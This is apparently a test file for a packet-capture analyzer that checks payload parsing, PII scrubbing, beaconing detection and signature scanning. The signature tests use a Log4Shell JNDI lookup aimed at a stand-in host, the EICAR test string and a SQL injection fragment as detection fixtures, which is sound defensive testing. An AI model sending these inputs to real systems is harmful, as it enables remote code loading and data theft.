// SPDX-License-Identifier: MIT
// Copyright (c) 2026 netscope contributors
import { describe, it, expect, beforeAll } from 'vitest';
import { loadApp, tcpFrame, udpFrame, bytes } from './load-app.js';

let app;
beforeAll(() => { app = loadApp(); });

describe('formatBytes', () => {
  it('formats B / KB / MB', () => {
    expect(app.formatBytes(512)).toBe('512 B');
    expect(app.formatBytes(2048)).toBe('2.0 KB');
    expect(app.formatBytes(5 * 1048576)).toBe('5.0 MB');
  });
});

describe('extractPayload', () => {
  it('strips Ethernet/IP/TCP headers to reach the payload', () => {
    const frame = tcpFrame(bytes('GET / HTTP/1.1\r\n'));
    const payload = app.extractPayload(frame);
    expect(app.decodeStreamText(payload)).toBe('GET / HTTP/1.1\r\n');
  });
  it('handles UDP frames', () => {
    const frame = udpFrame(bytes('hello'), { srcPort: 53, dstPort: 5353 });
    expect(app.decodeStreamText(app.extractPayload(frame))).toBe('hello');
  });
  it('returns null for a runt frame', () => {
    expect(app.extractPayload([1, 2, 3])).toBeNull();
  });
});

describe('decodeStreamText', () => {
  it('keeps printable + newlines, dots the rest', () => {
    expect(app.decodeStreamText([65, 0, 66, 10, 9])).toBe('A·B\n\t');
  });
});

describe('isPublicIp', () => {
  it('classifies public vs private/loopback/link-local', () => {
    expect(app.isPublicIp('8.8.8.8')).toBe(true);
    expect(app.isPublicIp('192.168.1.1')).toBe(false);
    expect(app.isPublicIp('10.0.0.1')).toBe(false);
    expect(app.isPublicIp('172.16.5.4')).toBe(false);
    expect(app.isPublicIp('127.0.0.1')).toBe(false);
    expect(app.isPublicIp('169.254.1.1')).toBe(false);
    expect(app.isPublicIp('::1')).toBe(false);
    expect(app.isPublicIp('fe80::1')).toBe(false);
    expect(app.isPublicIp('2001:4860:4860::8888')).toBe(true);
    expect(app.isPublicIp(null)).toBe(false);
  });
});

describe('shannonEntropy', () => {
  it('is 0 for empty and uniform data, ~8 for a full byte spread', () => {
    expect(app.shannonEntropy([])).toBe(0);
    expect(app.shannonEntropy([7, 7, 7, 7])).toBe(0);
    const allBytes = Array.from({ length: 256 }, (_, i) => i);
    expect(app.shannonEntropy(allBytes)).toBeCloseTo(8, 5);
  });
});

describe('scrubText (GDPR/KVKK)', () => {
  it('masks emails, credentials, tokens and card numbers', () => {
    expect(app.scrubText('contact me at alice@example.com')).toContain('‹email›');
    expect(app.scrubText('password=hunter2xyz')).toContain('‹redacted›');
    expect(app.scrubText('token: ' + 'A'.repeat(30))).toMatch(/‹token›|‹redacted›/);
    expect(app.scrubText('card 4111 1111 1111 1111')).toContain('‹card›');
  });
});

describe('anonymizeIps', () => {
  it('maps each distinct IP consistently and preserves loopback', () => {
    const { text } = app.anonymizeIps('from 1.2.3.4 to 1.2.3.4 and 5.6.7.8');
    expect(text).toBe('from host-1 to host-1 and host-2');
    expect(app.anonymizeIps('127.0.0.1').text).toBe('127.0.0.1');
  });
});

describe('guessProtocol', () => {
  it('identifies SSH, HTTP and TLS from payload/port', () => {
    const ssh = app.guessProtocol({ raw: tcpFrame(bytes('SSH-2.0-OpenSSH_9'), { dstPort: 22 }), dst_port: 22 });
    expect(ssh.label).toMatch(/SSH/);
    const http = app.guessProtocol({ raw: tcpFrame(bytes('GET / HTTP/1.1\r\n')), dst_port: 80 });
    expect(http.label).toMatch(/HTTP/);
    const tls = app.guessProtocol({ raw: tcpFrame([0x16, 0x03, 0x03, 0x00, 0x05, 1, 2, 3, 4, 5], { dstPort: 443 }), dst_port: 443 });
    expect(tls.label).toMatch(/TLS/);
  });
});

describe('scanSignatures (YARA-lite)', () => {
  const pkt = (str) => ({ raw: tcpFrame(bytes(str)), src_addr: '1.1.1.1', dst_addr: '2.2.2.2' });
  it('matches Log4Shell, EICAR and SQLi indicators', () => {
    const ids = (pkts) => app.scanSignatures(pkts).map((h) => h.sig.id);
    expect(ids([pkt('a ${jndi:ldap://evil/x} b')])).toContain('log4shell');
    expect(ids([pkt('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD')])).toContain('eicar');
    expect(ids([pkt("id=1 union select password from users")])).toContain('sqli');
  });
});

describe('detectBeaconing', () => {
  it('flags a destination contacted at regular intervals', () => {
    const base = 1_700_000_000_000;
    const pkts = [];
    for (let i = 0; i < 8; i++) pkts.push({ dst_addr: '203.0.113.9', epoch_ms: base + i * 5000 });
    const hits = app.detectBeaconing(pkts);
    expect(hits.length).toBe(1);
    expect(hits[0].dst).toBe('203.0.113.9');
    expect(hits[0].interval).toBe(5);
  });
  it('ignores irregular timing', () => {
    const base = 1_700_000_000_000;
    const gaps = [1000, 9000, 2000, 15000, 800, 30000];
    let t = base; const pkts = [{ dst_addr: '203.0.113.9', epoch_ms: t }];
    for (const g of gaps) { t += g; pkts.push({ dst_addr: '203.0.113.9', epoch_ms: t }); }
    expect(app.detectBeaconing(pkts).length).toBe(0);
  });
});

describe('semanticEvents', () => {
  it('reads HTTP request and response meaning', () => {
    const req = app.semanticEvents({ raw: tcpFrame(bytes('GET /login HTTP/1.1\r\nHost: x\r\n\r\n')), dst_host: 'x.com' });
    expect(req.some((e) => /GET \/login/.test(e.text))).toBe(true);
    const resp = app.semanticEvents({ raw: tcpFrame(bytes('HTTP/1.1 404 Not Found\r\n\r\n')) });
    expect(resp.some((e) => /404|not found/i.test(e.text))).toBe(true);
  });
});

describe('beautifyPayload', () => {
  it('recognises JSON bodies', () => {
    const b = app.beautifyPayload('{"ok":true,"n":5}');
    expect(b).not.toBeNull();
    expect(b.kind).toBe('JSON');
  });
  it('returns null for plain text', () => {
    expect(app.beautifyPayload('just some words')).toBeNull();
  });
});

describe('packetToCurl', () => {
  it('turns an HTTP request into a cURL command', () => {
    const pkt = { raw: tcpFrame(bytes('GET /api/users HTTP/1.1\r\nHost: example.com\r\nAccept: application/json\r\n\r\n')), dst_port: 80 };
    const curl = app.packetToCurl(pkt);
    expect(curl).toContain('curl -X GET');
    expect(curl).toContain('http://example.com/api/users');
    expect(curl).toContain('Accept: application/json');
  });
});

describe('service / tracker / CVE classification', () => {
  it('classifyService maps hostnames to owners', () => {
    expect(app.classifyService('storage.googleapis.com')).toBe('Google');
    expect(app.classifyService('d1234.cloudfront.net')).toBe('Amazon AWS / CloudFront');
    expect(app.classifyService('example.org')).toBe('Other');
  });
  it('classifyTracker recognises analytics/ad networks', () => {
    expect(app.classifyTracker('www.google-analytics.com').cat).toBe('Analytics');
    expect(app.classifyTracker('example.com')).toBeNull();
  });
  it('matchCVE flags known-vulnerable server banners', () => {
    expect(app.matchCVE('Apache/2.4.49').id).toBe('CVE-2021-41773');
    expect(app.matchCVE('nginx/1.10.3').id).toBe('old-nginx');
    expect(app.matchCVE('PHP/7.2.1').id).toBe('php-eol');
    expect(app.matchCVE('MyServer/1.0')).toBeNull();
  });
});

describe('isNoise', () => {
  it('flags discovery ports and update/telemetry hosts', () => {
    expect(app.isNoise({ dst_port: 5353 })).toBe(true);
    expect(app.isNoise({ dst_host: 'fe2.update.microsoft.com' })).toBe(true);
    expect(app.isNoise({ dst_port: 443, dst_host: 'example.com', summary: '' })).toBe(false);
  });
});

describe('bytesToCode', () => {
  it('emits C / Rust / Python literals', () => {
    expect(app.bytesToCode([0x41, 0x42], 'c')).toContain('0x41, 0x42');
    expect(app.bytesToCode([0x41, 0x42], 'rust')).toContain('[u8; 2]');
    expect(app.bytesToCode([65, 66], 'python')).toBe('payload = bytes([65, 66])');
  });
});

describe('transport helpers', () => {
  it('transportOf and protoRank', () => {
    expect(app.transportOf('HTTP')).toBe('tcp');
    expect(app.transportOf('DNS')).toBe('udp');
    expect(app.transportOf('ARP')).toBe('arp');
    expect(app.protoRank('HTTP')).toBeGreaterThan(app.protoRank('TCP'));
  });
});

describe('analyzeCapture (integration)', () => {
  it('flags cleartext credentials over HTTP as a high finding', () => {
    const pkts = [{
      protocol: 'HTTP', length: 120, src_addr: '10.0.0.5', dst_addr: '93.184.216.34',
      dst_host: 'insecure.example', dst_port: 80,
      raw: tcpFrame(bytes('POST /login HTTP/1.1\r\nHost: insecure.example\r\n\r\nuser=a&password=secret')),
      summary: 'HTTP POST /login',
    }];
    const findings = app.analyzeCapture(pkts);
    expect(findings.some((f) => f.severity === 'high' && /credential/i.test(f.title))).toBe(true);
  });
});
